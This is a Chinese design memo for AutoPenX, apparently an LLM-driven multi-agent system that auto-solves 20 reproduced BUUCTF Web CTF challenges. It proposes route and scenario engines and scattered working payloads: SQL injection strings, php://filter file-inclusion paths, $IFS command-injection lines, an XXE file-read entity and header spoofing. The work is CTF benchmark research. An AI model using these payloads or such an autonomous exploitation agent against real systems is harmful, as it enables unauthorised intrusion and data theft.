# AutoPenX 基于 BUUCTF 20 题的 Web 解题特化 Agent 评估与实现建议

> 编写时间：2026-05-21  
> 项目路径：`C:\Users\86181\Desktop\AutoPenX`  
> 当前主线：不再优先扩展自造 `STRICT_BENCHMARK_30`，而是以 BUUCTF/经典 Web 题复现集作为真实能力验证主战场  
> 当前最好完整结果：`benchmark_results/real_ctf_20260521_234645.json`  
> 当前最好完整成绩：`19/20 passed`，`success_rate = 0.95`  
> 当前主要未闭环题：`gxyctf2019_pingpingping`

---

## 1. 总体判断

你没有继续做 30 道自定义题，而是转向 BUUCTF 上选 20 道基础 Web 题来解题和调优，这个选择是对的。

原因很简单：

```text
自定义 benchmark 能证明架构跑通；
BUUCTF 基础题能证明解题套路接近真实比赛。
```

此前 `STRICT_BENCHMARK_12` 已经能达到 `12/12`，说明 `MultiAgentOrchestrator`、`WebStateBlackboard`、`RouteStateMachine`、`ExploitAgent` 这套骨架已经成立。继续堆 30 个同风格自造题，价值会下降，因为它更容易变成“针对自己靶场的 payload 表”。

BUUCTF 20 题的价值更高，因为它引入了真实 CTF Web 题里的常见模式：

- 登录型 SQL 注入。
- 文件上传绕过。
- 源码泄露后反序列化。
- PHP 文件包含与 `php://filter`。
- SQL 关键字过滤与双写绕过。
- 堆叠注入与 `handler` 绕过。
- MD5 raw 注入与 `0e` 类型 juggling。
- Tornado/Jinja 类 SSTI。
- Cookie/Header/POST 组合型逻辑题。
- SSRF 签名链。
- XXE。
- 命令执行过滤绕过。
- 非字母 RCE 构造。

所以现在项目阶段应该重新定义为：

```text
AutoPenX 已完成自定义 Web benchmark MVP；
当前进入 BUUCTF 20 题真实题型特化调优阶段；
下一步目标不是“更多题”，而是“把真实题套路抽象成可复用 route 能力”。
```

---

## 2. 当前 BUUCTF 20 题验证集

当前 20 题来自：

```text
tests/benchmark/real_ctf_targets.py
tests/benchmark/_real_ctf_extra.py
```

测试入口：

```text
tests/benchmark/test_real_ctf.py
```

运行方式：

```powershell
pytest tests/benchmark/test_real_ctf.py -m real_ctf -v -s
```

### 2.1 题目清单

| 序号 | Target ID | 类型 | 核心套路 |
|---:|---|---|---|
| 1 | `geek2019_easysql` | SQLi | 登录表单万能密码 |
| 2 | `geek2019_upload` | Upload | `.phtml` + MIME 绕过 |
| 3 | `hctf2018_warmup` | LFI | 源码提示 + 白名单绕过 + 文件包含 |
| 4 | `geek2019_php` | PHP POP | 备份源码泄露 + PHP 反序列化 |
| 5 | `suctf2019_easysql` | SQLi | 堆叠/特殊查询构造 |
| 6 | `qwb2019_random_inject` | SQLi | `select` 被禁 + `handler` 绕过 |
| 7 | `gyctf2020_blacklist` | SQLi | 黑名单更强 + `handler` 绕过 |
| 8 | `geek2019_babysql` | SQLi | 关键字过滤一次 + 双写绕过 |
| 9 | `geek2019_secretfile` | LFI | 隐藏路径 + `php://filter` 读取源码 |
| 10 | `actf2020_include` | LFI | `php://filter/read=convert.base64-encode` |
| 11 | `bjdctf2020_easymd5` | SQLi/Auth | `ffifdyop` MD5 raw SQL 注入 |
| 12 | `hwb2018_easy_tornado` | SSTI | Tornado error page 模板注入 |
| 13 | `geek2019_buyflag` | Auth/Logic | Cookie + POST + 数组绕过 |
| 14 | `geek2019_http` | Header/Auth | Referer + X-Forwarded-For |
| 15 | `geek2019_easyphp` | PHP Logic | MD5 `0e` loose comparison |
| 16 | `wdb2020_areuserialz` | PHP POP | 反序列化读文件 |
| 17 | `de1ctf2019_ssrfme` | SSRF | `geneSign` + `De1ta` 两阶段签名链 |
| 18 | `nctf2019_truexml` | XXE | XML 外部实体读文件 |
| 19 | `gxyctf2019_pingpingping` | CMDi | 空格过滤 + `$IFS` 绕过 |
| 20 | `geek2019_rceme` | CMDi/RCE | 字母过滤 + XOR/NOT 构造 |

### 2.2 当前最好结果

最佳完整报告：

```text
benchmark_results/real_ctf_20260521_234645.json
```

结果：

```text
20 targets
19 passed
1 failed
success_rate = 0.95
```

唯一未通过：

```text
gxyctf2019_pingpingping
reason = flag_not_found
rounds = 15
```

这说明项目已经不是简单“会跑 CTF benchmark”，而是已经具备了相当强的 Web 基础题自动解题能力。

---

## 3. 我对当前方向的核心想法

### 3.1 不要把 BUUCTF 20 题当作 20 个孤立 payload

现在最危险的做法是继续在 `route_state_machine.py` 里堆：

```text
如果是某题，就试某 payload；
如果失败，再加一个 payload；
直到 20 题全过。
```

这会短期变强，但长期会退化成题库脚本。

更好的做法是把每道 BUUCTF 题抽象为一个“能力单元”：

```text
题目实例 -> 解题套路 -> route 能力 -> 可复用策略 -> 可验证回归
```

例如：

```text
[极客大挑战 2019] BabySQL
  不是只记住 payload: admin' oorr ...
  而是抽象成：关键字只过滤一次 -> 双写绕过 -> 登录 SQLi 变体
```

```text
[GXYCTF2019] Ping Ping Ping
  不是只记住 ?ip=127.0.0.1;cat$IFS$9flag.php
  而是抽象成：命令注入存在 -> 空格被过滤 -> 使用 $IFS / ${IFS} / $IFS$9 替代空格 -> 读 flag
```

### 3.2 Agent 的价值不在“会不会试 payload”，而在“能不能识别套路并切换策略”

Web CTF 基础题通常不是单个漏洞点，而是小型链路：

```text
发现入口 -> 识别过滤 -> 选择绕过族 -> 执行 payload -> 解码/二次请求 -> 提取 flag
```

因此 AutoPenX 应该从“路线状态机”继续升级为“套路状态机”：

```text
route = sqli
  scenario = login_bypass | union | stacked | handler | double_write | md5_raw

route = lfi
  scenario = direct_read | php_filter | whitelist_bypass | hidden_endpoint | source_audit

route = cmdi
  scenario = separator_probe | space_bypass | keyword_bypass | non_alpha_rce
```

这比简单的 `sqli / lfi / cmdi` 粒度更适合 BUUCTF。

### 3.3 现在应该从“题目通过率”转向“能力覆盖率”

只看 `19/20` 会掩盖结构问题。下一阶段应该同时统计：

```text
题目通过率
route 覆盖率
scenario 覆盖率
平均轮数
重复动作比例
LLM 介入次数
deterministic 命中率
失败 stop_reason 可解释率
```

建议新增指标：

```text
capability_coverage = 已验证 scenario 数 / 计划 scenario 数
```

例如：

```text
sqli.login_bypass: pass
sqli.stacked_handler: pass
sqli.double_write: pass
sqli.md5_raw: pass
lfi.php_filter: pass
cmdi.space_bypass: fail
```

这样你能看到项目到底强在哪、弱在哪。

---

## 4. 架构实现建议

### 4.1 保留现有四 Agent 架构，不新增角色

现有结构已经够用：

```text
MultiAgentOrchestrator
  -> CoordinatorAgent
  -> ReconAgent
  -> ExploitAgent
  -> CriticAgent
  -> WebStateBlackboard
  -> RouteStateMachine
```

不建议现在再加很多 Agent，例如 `SQLAgent`、`LFIAgent`、`BUUCTFAgent`。这会让控制流复杂，但对 20 道基础题帮助有限。

更好的方式是：

```text
Agent 数量不变；
RouteStateMachine 内部能力变细；
Blackboard 记录更结构化；
Benchmark 报告更可诊断。
```

### 4.2 将 `RouteStateMachine` 从大文件拆成 route 包

当前核心逻辑集中在：

```text
autopnex/ctf/route_state_machine.py
```

这个文件已经承担太多职责：

- 基类。
- `RouteResult`。
- HTTP helper。
- 所有 route machine。
- factory registry。
- run_route。

继续把 BUUCTF 20 题的所有套路都塞进去，会越来越难维护。

建议逐步拆成：

```text
autopnex/ctf/routes/
  __init__.py
  base.py
  registry.py
  source_leak.py
  lfi.py
  sqli.py
  ssti.py
  cmdi.py
  upload.py
  php_pop.py
  auth_logic.py
  ssrf.py
  xxe.py
```

迁移顺序建议：

```text
先不重构行为，只移动代码；
再增加 scenario 层；
最后再调整 factory。
```

初始拆分后：

```text
autopnex/ctf/route_state_machine.py
```

只保留兼容入口：

```text
from autopnex.ctf.routes.registry import MACHINE_REGISTRY, create_machine, run_route
```

这样可以不破坏现有调用方。

### 4.3 给 RouteResult 增加诊断字段

当前 `RouteResult` 信息不够支撑 BUUCTF 逐题调优。建议扩展为：

```python
@dataclass
class RouteResult:
    route: str
    status: Literal["success", "failed", "inconclusive", "handoff"]
    flag: Optional[str] = None
    best_evidence_score: float = 0.0
    steps_executed: int = 0
    stop_reason: str = ""
    handoff_target: Optional[str] = None
    scenario: str = ""
    best_probe_name: str = ""
    best_probe_score: float = 0.0
    steps_attempted: List[Dict[str, Any]] = field(default_factory=list)
    last_request: Dict[str, Any] = field(default_factory=dict)
    last_response_excerpt: str = ""
    decoded_outputs: List[Dict[str, str]] = field(default_factory=list)
    blockers: List[str] = field(default_factory=list)
    attempts_made: List[Dict] = field(default_factory=list)
```

这会直接解决真实题调优里的核心问题：

```text
不是只知道 flag_not_found；
而是知道卡在了哪个 scenario、哪个 payload、哪个响应、哪个过滤器。
```

### 4.4 HTTP history 必须记录响应摘要

当前 `_http_history` 主要记录：

```text
method
url
params
status
```

建议增加：

```text
request_headers
request_body_excerpt
response_headers
response_excerpt
content_type
content_length
flag_candidates
```

尤其是 BUUCTF 题里，响应文本经常直接提示过滤器：

```text
fxck your space!
Blocked keyword detected!
preg_match('/[a-z]/is') matched!
return preg_match("/select|update|delete|drop|insert|where/i")
```

这些提示应该被结构化记录到 blackboard，而不是丢在日志里。

---

## 5. 针对 BUUCTF 20 题的 route 实现建议

### 5.1 SQLiMachine：从“SQL 注入”升级为 SQLi scenario 引擎

当前 BUUCTF 20 题里 SQLi 占比很高：

```text
geek2019_easysql
suctf2019_easysql
qwb2019_random_inject
gyctf2020_blacklist
geek2019_babysql
bjdctf2020_easymd5
```

建议 `SQLiMachine` 内部增加 scenario：

```text
login_bypass
union_based
boolean_blind
stacked_query
handler_bypass
double_write_bypass
md5_raw_bypass
```

#### 建议实现结构

```text
SQLiMachine.preconditions_met()
  -> 从 form input 识别 username/password/query/inject/user_id/q
  -> 从响应文本识别 SQL 错误或登录失败语义
  -> 从页面提示识别 blacklist/filter/MD5

SQLiMachine.get_probes()
  -> 分 scenario 返回探测 payload

SQLiMachine.score_evidence()
  -> 登录成功、错误回显、blocked keyword、响应差异、flag 出现

SQLiMachine.get_exploit_steps()
  -> 按 scenario 输出 exploit steps
```

#### 需要沉淀的 payload families

```text
login_bypass:
  admin' or '1'='1
  admin'--
  ' or true--

stacked_handler:
  1';handler Flag open;handler Flag read first;
  1';handler FlagHere open;handler FlagHere read first;

double_write:
  oorr
  ununionion
  seselectlect
  frfromom
  whwhereere

md5_raw:
  ffifdyop

suctf_easy_sql:
  *,1
  1;set sql_mode=PIPES_AS_CONCAT;select 1
```

#### 代码落点

```text
autopnex/ctf/routes/sqli.py
```

如果暂时不拆文件，则先落在：

```text
autopnex/ctf/route_state_machine.py::SQLiMachine
```

---

### 5.2 LFIMachine：强化“源码提示 -> 隐藏路径 -> php filter -> 解码提 flag”

BUUCTF 20 中 LFI 典型题：

```text
hctf2018_warmup
geek2019_secretfile
actf2020_include
```

这些题不是简单 `/flag`，而是常见链路：

```text
页面源码/注释发现入口
  -> 访问隐藏 php
    -> 发现 file 参数
      -> php://filter 读取 flag.php
        -> base64 解码
          -> 提取 flag
```

#### 建议新增能力

```text
hidden_endpoint_discovery:
  - 解析 HTML 注释
  - 解析 a href
  - 跟踪 302 Location
  - 识别 source.php / secr3t.php / Archive_room.php / end.php

php_filter_decoder:
  - 自动识别 base64 响应
  - 解码后再跑 flag regex
  - 解码后记录 decoded_outputs

whitelist_bypass:
  - source.php%253f/../../../../flag
  - source.php%3f/../../../../flag
  - hint.php%253f/../../../../flag
```

#### 代码建议

`LFIMachine.run_probes()` 不应只看 `/etc/passwd`。对 CTF 来说，更高 ROI 的 probe 是：

```text
/?file=php://filter/convert.base64-encode/resource=index.php
/?file=php://filter/read=convert.base64-encode/resource=flag.php
/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

同时应把“是否 base64”作为 evidence：

```text
base64_decode_success + decoded contains <?php => strong LFI/source evidence
base64_decode_success + decoded contains flag => success
```

---

### 5.3 CMDiMachine：优先修复 `gxyctf2019_pingpingping`

当前最佳完整报告唯一失败：

```text
gxyctf2019_pingpingping
```

该题核心是：

```text
参数名：ip
入口：GET /
过滤：空格被 ban
可用绕过：$IFS、${IFS}、$IFS$9
目标：cat flag.php
```

#### 问题判断

这类失败通常不是“没有 payload”，而是链路某一层没有闭环：

```text
Recon 没把 ip 识别为 cmdi 参数
Coordinator 没及时切到 cmdi
CMDiMachine 没尝试 $IFS 族 payload
payload 被 requests 编码后服务端解析与预期不一致
flag.php 和 /flag 的目标路径优先级不对
```

#### 建议优先加入的 exploit steps

```text
GET /?ip=127.0.0.1;cat$IFS$9flag.php
GET /?ip=127.0.0.1;cat${IFS}flag.php
GET /?ip=127.0.0.1;cat$IFSflag.php
GET /?ip=127.0.0.1;tac$IFS$9flag.php
GET /?ip=127.0.0.1;nl$IFS$9flag.php
GET /?ip=127.0.0.1%0acat$IFS$9flag.php
GET /?ip=127.0.0.1%0acat${IFS}flag.php
```

#### 建议增加的 filter detector

当响应中出现：

```text
fxck your space
space
空格
```

应写入 blackboard：

```json
{
  "route": "cmdi",
  "scenario": "space_bypass",
  "blocker": "space_filtered",
  "next_hint": "try $IFS/${IFS}/$IFS$9"
}
```

#### 代码落点

```text
autopnex/ctf/routes/cmdi.py
```

或当前：

```text
autopnex/ctf/route_state_machine.py::CMDiMachine
```

### 5.4 新增一等公民 `XXEMachine`

BUUCTF 20 里有：

```text
nctf2019_truexml
```

当前 `MACHINE_REGISTRY` 中没有明确 `xxe` route，会导致 XXE 能力不够清晰。即使当前能通过，也可能是因为 fallback 或其他泛化逻辑碰巧打到。

建议新增：

```text
XXEMachine
route = "xxe"
```

能力：

```text
识别 application/xml
识别页面 JS 中 fetch XML
识别 <user><username>...</username></user> 结构
POST XML payload
尝试 file:///flag、file:///flag.txt、file:///etc/passwd
从 XML 响应中提取 flag
```

示例 exploit step：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
<user><username>&xxe;</username><password>test</password></user>
```

需要改：

```text
autopnex/ctf/routes/xxe.py
autopnex/ctf/routes/registry.py
autopnex/ctf/strategy.py DEFAULT_WEB_ROUTES
autopnex/ctf/route_cards.py
```

---

### 5.5 新增 `AuthLogicMachine`，不要把逻辑题塞进 PHP POP

BUUCTF 20 中这两题本质是认证/请求语义操控：

```text
geek2019_buyflag
geek2019_http
```

它们不是传统漏洞扫描题，而是 CTF Web 逻辑题。

建议新增：

```text
AuthLogicMachine
route = "auth_logic"
```

覆盖：

```text
Cookie role/admin manipulation
Header manipulation
Referer bypass
X-Forwarded-For spoofing
POST 参数类型绕过
money[]=100000000 这种数组绕过
```

#### BuyFlag scenario

```text
Cookie: user=1
POST password=404&money[]=100000000
```

#### HTTP scenario

```text
Referer: https://www.Sycsecret.com
X-Forwarded-For: 127.0.0.1
```

#### 代码建议

`ReconAgent` 应该把页面文字中的提示写入 blackboard：

```text
Referer
X-Forwarded-For
Please come from
Only local user
money
password
is_numeric
```

然后 `CoordinatorAgent` 给 `auth_logic` 加分。

---

### 5.6 PHP POP 与 PHP Logic 要拆开

当前 BUUCTF 20 中 PHP 类题至少有三类：

```text
geek2019_php: 反序列化对象注入
wdb2020_areuserialz: 反序列化读文件
geek2019_easyphp: MD5 0e loose comparison
```

它们不应全部放在 `php_pop` 一个篮子里。

建议拆为：

```text
php_deser
php_type_juggling
php_source_audit
```

如果暂时不想拆 route，至少在 `PHPPopMachine` 内部做 scenario：

```text
scenario = unserialize_private_props
scenario = areuserialz_filehandler
scenario = md5_0e_loose_compare
```

需要沉淀 payload：

```text
QNKCDZO / 240610708
s878926199a / s155964671a
240610708 / QNKCDZO
O:... serialized object payload
S: escaped serialized payload
```

---

### 5.7 SSRFMachine 要支持“两阶段签名链”

`de1ctf2019_ssrfme` 能过是好迹象，但建议把它抽象为能力：

```text
step1: GET /geneSign?param=flag.txt
step2: 读取 sign/cookie/token
step3: GET /De1ta?param=flag.txt with sign
```

需要 `RouteStateMachine` 支持：

```text
step output -> next step input
```

也就是 exploit step 之间要能传变量：

```json
{
  "name": "get_sign",
  "extract": {"cookie": "sign"}
}
```

```json
{
  "name": "use_sign",
  "headers_from_context": ["Cookie"]
}
```

这对真实 CTF 非常重要，因为很多题是多阶段链路。

---

## 6. Benchmark 与报告实现建议

### 6.1 区分完整 20 题报告和单题调试报告

现在 `benchmark_results` 里既有完整 20 题报告，也有单题报告。最新文件不一定代表总体状态，例如：

```text
real_ctf_20260521_234833.json
  total = 1
  target = gxyctf2019_pingpingping
  passed = 0
```

这容易误导判断。

建议报告字段增加：

```json
{
  "suite": "real_ctf_20",
  "run_mode": "full" 或 "single_target",
  "target_filter": null 或 "gxyctf2019_pingpingping"
}
```

文件命名建议：

```text
real_ctf20_full_YYYYMMDD_HHMMSS.json
real_ctf20_single_gxyctf2019_pingpingping_YYYYMMDD_HHMMSS.json
```

### 6.2 每题结果增加 route 诊断字段

当前 `test_real_ctf.py` 返回字段偏少：

```text
target_id
success
flag
expected_flag
rounds
time_seconds
failure_reason
```

建议增加：

```text
winning_route
selected_routes
final_route
final_status
stop_reason
best_evidence_score
scenario
repeat_ratio
last_request
last_response_excerpt
candidate_flags
```

这样可以快速看出：

```text
PingPingPing 是没选 cmdi？
还是选了 cmdi 但没有 space_bypass？
还是 payload 打到了但没提取 flag？
```

### 6.3 保存失败题 blackboard 快照

建议每个失败题保存：

```text
benchmark_results/debug/<run_id>/<target_id>_blackboard.json
benchmark_results/debug/<run_id>/<target_id>_action_log.json
benchmark_results/debug/<run_id>/<target_id>_http_history.json
```

这比直接看 pytest 输出高效得多。

---

## 7. Blackboard 设计建议

`WebStateBlackboard` 是这个项目最关键的结构之一。下一阶段应让它不仅记录 evidence，还记录“题型线索”。

建议新增结构：

```python
@dataclass
class ScenarioHint:
    route: str
    scenario: str
    confidence: float
    source: str
    detail: str
    payload_family: str = ""
```

示例：

```json
{
  "route": "cmdi",
  "scenario": "space_bypass",
  "confidence": 0.85,
  "source": "response_filter_detector",
  "detail": "Response contains 'fxck your space'",
  "payload_family": "ifs_space_bypass"
}
```

再比如：

```json
{
  "route": "sqli",
  "scenario": "double_write_bypass",
  "confidence": 0.8,
  "source": "page_hint",
  "detail": "Page says keywords are filtered once",
  "payload_family": "double_write_keywords"
}
```

`CoordinatorAgent` 选择 route 时，不应只看 route 分数，也要看 scenario hint：

```text
route_score = route_priority + evidence + param_hint + scenario_hint - failures
```

---

## 8. LLM 应该如何参与 BUUCTF 20 题

### 8.1 固定套路仍然应该 deterministic

BUUCTF 基础题中的常见套路应由状态机稳定解决：

```text
ffifdyop
0e collision
php://filter
handler read first
$IFS 绕过
Referer / XFF
XML ENTITY
```

这些不应该每次问 LLM。

### 8.2 LLM 适合处理“源码审计”和“过滤器归纳”

LLM 应该出现在以下场景：

```text
源码泄露后：分析 class、magic method、sink、参数名
响应提示复杂过滤：归纳被过滤字符/关键字
状态机失败：根据最近 5 个请求响应生成新 payload family
未知题型：给出 route/scenario 分类
```

建议新增一个结构化 fallback：

```text
ExploitAgent._llm_fallback(route, route_result)
```

输入不是完整日志，而是：

```json
{
  "target_id": "gxyctf2019_pingpingping",
  "route": "cmdi",
  "scenario_hints": ["space_filtered"],
  "params": ["ip"],
  "last_responses": ["fxck your space!"],
  "failed_payloads": ["127.0.0.1;cat flag.php"],
  "goal": "find flag"
}
```

输出必须是可执行 JSON：

```json
{
  "route": "cmdi",
  "hypothesis": "space is blocked, use IFS as separator",
  "actions": [
    {
      "method": "GET",
      "path": "/",
      "params": {"ip": "127.0.0.1;cat$IFS$9flag.php"}
    }
  ],
  "success_criteria": "response contains flag regex"
}
```

### 8.3 LLM 输出必须由 runtime 执行，不能只写入 reasoning

这点非常重要。

LLM 如果只是说：

```text
你可以尝试 $IFS 绕过
```

那对自动解题没有帮助。

它必须返回 action schema，然后由 `ExploitAgent` 执行并把结果写回 blackboard。

---

## 9. 推荐实施路线

### Phase 1：固化 BUUCTF 20 题基线

目标：让当前 `19/20` 成为可重复、可解释的 baseline。

任务：

```text
1. 更新文档，明确 30 自造题不是当前主线。
2. 将 BUUCTF 20 题定义为 real_ctf_20 suite。
3. 修改 test_real_ctf.py，区分 full run 和 single target run。
4. 保存 best full report 信息。
5. 每次完整运行输出 Markdown + JSON。
```

验收：

```text
pytest tests/benchmark/test_real_ctf.py -m real_ctf -v -s

至少保持：
19/20 passed
无 runtime error
失败题有明确诊断字段
```

### Phase 2：修复 PingPingPing，达到 20/20

目标：闭环 `cmdi.space_bypass`。

任务：

```text
1. 确认 Recon 是否识别 ip 参数。
2. 确认 Coordinator 是否选择 cmdi。
3. 在 CMDiMachine 中加入 IFS payload family。
4. 响应出现 fxck your space 时记录 blocker=space_filtered。
5. 单题运行 gxyctf2019_pingpingping。
6. 完整运行 BUUCTF 20。
```

验收：

```text
gxyctf2019_pingpingping passed
real_ctf_20 = 20/20
```

### Phase 3：重构 route 结构，降低维护成本

目标：让代码从“巨型状态机文件”变成可扩展 route 包。

任务：

```text
1. 新建 autopnex/ctf/routes/base.py。
2. 迁移 RouteStateMachine、EvidenceScore、RouteResult。
3. 新建 routes/registry.py。
4. 逐个迁移 sqli/lfi/cmdi/php_pop/auth_logic/xxe。
5. route_state_machine.py 保留兼容导入。
```

验收：

```text
STRICT_BENCHMARK_12 仍 12/12
real_ctf_20 仍 >= 19/20
```

### Phase 4：从题目通过率转向能力覆盖率

目标：把 BUUCTF 20 题沉淀成能力矩阵。

任务：

```text
1. 为每题增加 expected_route / expected_scenario。
2. 报告输出 scenario_coverage。
3. 每个 route 输出 pass/fail 数。
4. 每个 scenario 输出 pass/fail 数。
```

示例：

```json
{
  "scenario_coverage": {
    "sqli.login_bypass": "pass",
    "sqli.handler_bypass": "pass",
    "sqli.double_write": "pass",
    "cmdi.space_bypass": "fail",
    "xxe.file_read": "pass"
  }
}
```

### Phase 5：加入真实远程 BUUCTF 适配层

当前是“BUUCTF 题型本地复现”。如果后续要直接对 BUUCTF 动态靶机跑，需要加：

```text
TargetSessionProfile
  - base_url
  - reset handling
  - flag submission disabled/enabled
  - rate limit
  - timeout
  - cookies
  - challenge notes
```

建议不要直接把平台登录、题目启动、提交 flag 混进 solver。应该分层：

```text
platform adapter: 管理 BUUCTF 平台交互
solver: 只负责解目标 URL
```

---

## 10. 代码改动优先级清单

### P0

| 文件 | 建议 |
|---|---|
| `tests/benchmark/test_real_ctf.py` | 增加 full/single run 标记、报告字段、失败快照 |
| `autopnex/ctf/route_state_machine.py::CMDiMachine` | 修复 `$IFS` 空格绕过，优先解决 PingPingPing |
| `autopnex/ctf/web_state_blackboard.py` | 增加 scenario/blocker 线索记录 |
| `benchmark_results` 报告生成逻辑 | 区分 20 题完整报告与单题调试报告 |

### P1

| 文件 | 建议 |
|---|---|
| `autopnex/ctf/route_state_machine.py::SQLiMachine` | 增加 SQLi scenario：handler、double-write、md5 raw |
| `autopnex/ctf/route_state_machine.py::LFIMachine` | 强化 hidden endpoint、php filter decode、白名单绕过 |
| `autopnex/ctf/route_state_machine.py::PHPPopMachine` | 拆分反序列化与 MD5 类型 juggling |
| `autopnex/ctf/route_cards.py` | 增加 BUUCTF 常见套路 route card |

### P2

| 文件/目录 | 建议 |
|---|---|
| `autopnex/ctf/routes/` | 拆分 route machine 包 |
| `autopnex/ctf/routes/xxe.py` | 新增 XXE 一等 route |
| `autopnex/ctf/routes/auth_logic.py` | 新增 Cookie/Header/POST 逻辑绕过 route |
| `autopnex/ctf/multi_agent.py` | Coordinator 读取 scenario hint 参与 route 排序 |

### P3

| 模块 | 建议 |
|---|---|
| LLM fallback | 结构化 action 输出，不再只返回文本建议 |
| Source audit | 源码泄露后自动提取 class、sink、参数、magic method |
| Capability report | 输出 route/scenario coverage |

---

## 11. 最终目标定义

下一阶段不建议把目标写成：

```text
继续增加更多 BUUCTF 题
```

更好的目标是：

```text
将 BUUCTF 20 题中出现的基础 Web 解题套路沉淀为稳定、可复用、可诊断的 route/scenario 能力。
```

建议验收标准：

```text
BUUCTF 20 本地复现集：20/20 passed
STRICT_BENCHMARK_12：保持 12/12 passed
平均轮数：<= 8
单题最大轮数：<= 15
失败报告可解释率：100%
每个失败必须有 route、scenario、blocker、last_request、last_response_excerpt
```

长期目标：

```text
AutoPenX 不只是“能过 20 个脚本题”，而是具备一套 Web CTF 基础题能力矩阵：

SQLi scenario engine
LFI/source-audit engine
CMDi filter-bypass engine
PHP logic/deser engine
Auth/Header logic engine
SSRF chain engine
XXE engine
Upload engine
SSTI engine
```

当这些能力矩阵稳定后，再扩展更多真实题才有意义。

---

## 12. 一句话总结

你从“自定义 30 题”转向“BUUCTF 20 道基础题调优”是正确的路线升级。当前项目已经有 `19/20` 的强结果，说明 Web CTF Agent 的核心想法基本成立。下一步不要盲目堆题，而是修复 `PingPingPing`，把 `19/20` 固化为 `20/20`，然后把这些题背后的解题套路抽象成 route/scenario 能力矩阵。这样 AutoPenX 才会从“题库驱动的自动脚本”成长为“真正的 Web 解题特化 Agent”。
